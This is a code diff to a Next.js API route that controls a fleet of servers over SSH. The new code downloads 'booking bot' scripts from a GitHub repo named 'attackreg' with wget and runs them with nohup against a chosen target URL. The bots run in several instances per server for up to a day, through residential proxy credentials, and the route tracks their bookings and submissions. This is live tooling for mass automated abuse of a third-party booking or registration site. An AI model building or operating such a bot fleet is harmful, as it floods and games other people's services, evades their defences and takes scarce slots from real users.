@@ -129,10 +129,10 @@ export async function POST(req) {
       );
       return NextResponse.json({ results });
 
-    } else if (action === 'deploy-sesallameh') {
-      // Deploy the sesallameh booking bot script to all servers
+    } else if (action === 'deploy-sesallameh' || action === 'deploy-smart') {
+      // Deploy the smart/sesallameh booking bot script to all servers
       const ghBase = 'https://raw.githubusercontent.com/fanarali881-eng/attackreg/main';
-      const deployCmd = `wget -q -O /root/sesallameh_bot.py '${ghBase}/sesallameh_bot.py' && wc -c /root/sesallameh_bot.py && echo "Sesallameh bot deployed"`;
+      const deployCmd = `wget -q -O /root/sesallameh_bot.py '${ghBase}/sesallameh_bot.py' && wget -q -O /root/smart_bot.py '${ghBase}/smart_bot.py' && wc -c /root/sesallameh_bot.py /root/smart_bot.py && echo "Smart bot deployed"`;
       
       const results = await Promise.all(
         serverList.map(async (server) => {
@@ -165,19 +165,46 @@ export async function POST(req) {
       );
       return NextResponse.json({ results });
 
-    } else if (action === 'stop-sesallameh') {
+    } else if (action === 'start-smart') {
+      const safeUrl = sanitizeUrl(url);
+      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
+      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440);
+      const safeInstances = sanitizeNumber(instances, 3, 1, 10);
+
+      let proxyEnv = '';
+      if (proxies && proxies.length > 0) {
+        const p = proxies[0];
+        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
+      }
+
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "sesallameh_bot.py") 2>/dev/null; echo "Sesallameh bot stopped"', 15000);
+          const escapedUrl = safeUrl.replace(/'/g, "'\\''");
+          const fullCmd = `kill -9 $(pgrep -f "smart_bot.py") 2>/dev/null; sleep 1; ` +
+            `${proxyEnv} nohup python3 /root/smart_bot.py '${escapedUrl}' ${safeDuration} ${safeInstances} > /root/smart_bot.log 2>&1 & ` +
+            `echo "Smart bot started - ${safeUrl} ${safeDuration}min ${safeInstances} instances"`;
+          
+          const r = await runSSHCommand(server, fullCmd, 15000);
           return { host: server.host, ...r };
         })
       );
       return NextResponse.json({ results });
 
-    } else if (action === 'status-sesallameh') {
+    } else if (action === 'stop-sesallameh' || action === 'stop-smart') {
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const r = await runSSHCommand(server, 'cat /root/sesallameh_status.json 2>/dev/null || echo "{}"; echo "---"; pgrep -f sesallameh_bot.py > /dev/null && echo "RUNNING" || echo "STOPPED"', 10000);
+          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "sesallameh_bot.py") 2>/dev/null; kill -9 $(pgrep -f "smart_bot.py") 2>/dev/null; echo "Bot stopped"', 15000);
+          return { host: server.host, ...r };
+        })
+      );
+      return NextResponse.json({ results });
+
+    } else if (action === 'status-sesallameh' || action === 'status-smart') {
+      const statusFile = action === 'status-smart' ? 'smart_bot_status.json' : 'sesallameh_status.json';
+      const procName = action === 'status-smart' ? 'smart_bot.py' : 'sesallameh_bot.py';
+      const results = await Promise.all(
+        serverList.map(async (server) => {
+          const r = await runSSHCommand(server, `cat /root/${statusFile} 2>/dev/null || echo "{}"; echo "---"; pgrep -f ${procName} > /dev/null && echo "RUNNING" || echo "STOPPED"`, 10000);
           return { host: server.host, ...r };
         })
       );
@@ -199,9 +226,10 @@ export async function POST(req) {
         return {
           host: r.host,
           status: r.status === 'error' ? 'error' : (running ? 'running' : 'stopped'),
-          bookings: status.bookings || 0,
+          bookings: status.bookings || status.submissions || 0,
           errors: status.errors || 0,
           elapsed: status.elapsed || 0,
+          target_url: status.target_url || '',
           error: r.error
         };
       });
